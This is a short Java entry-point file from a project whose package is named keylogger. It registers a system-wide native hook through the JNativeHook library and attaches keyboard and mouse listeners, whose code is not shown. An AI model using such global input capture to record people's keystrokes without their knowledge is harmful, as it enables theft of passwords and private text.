package org.keylogger.app;

import org.keylogger.utils.KeyManager;
import org.keylogger.utils.MouseManager;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;

public class App {
    public static void main(String[] args) {
        try {
			GlobalScreen.registerNativeHook();
		}
		catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}

		MouseManager mm = new MouseManager();
        KeyManager km = new KeyManager();

		GlobalScreen.addNativeMouseListener(mm);
        GlobalScreen.addNativeKeyListener(km);
    }
}
